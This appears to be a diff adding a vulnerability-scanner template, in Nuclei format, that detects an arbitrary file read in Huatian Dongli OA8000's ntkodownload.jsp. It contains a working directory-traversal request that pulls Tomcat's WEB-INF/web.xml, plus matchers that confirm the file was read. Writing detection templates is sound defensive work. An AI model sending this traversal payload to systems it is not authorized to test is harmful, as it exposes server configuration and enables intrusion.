@@ -1,0 +1,28 @@
+id: huatiandongli-oa8000-ntkodownload-file-read
+info:
+  name: 华天动力OA8000 ntkodownload.jsp 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: directory-traversal, file-read
+  description: |
+    This template detects an arbitrary file read vulnerability in 华天动力OA8000 ntkodownload.jsp by checking for specific indicators in the fetched file.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/OAapp/jsp/trace/ntkodownload.jsp?filename=../../../../../../../htoa/Tomcat/webapps/ROOT/WEB-INF/web.xml"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "Welcome to Tomcat"
+          - "<?xml version=\"1.0"
+          - "www.apache.org"
+      - type: word
+        part: header
+        words:
+          - "application/octet-stream"
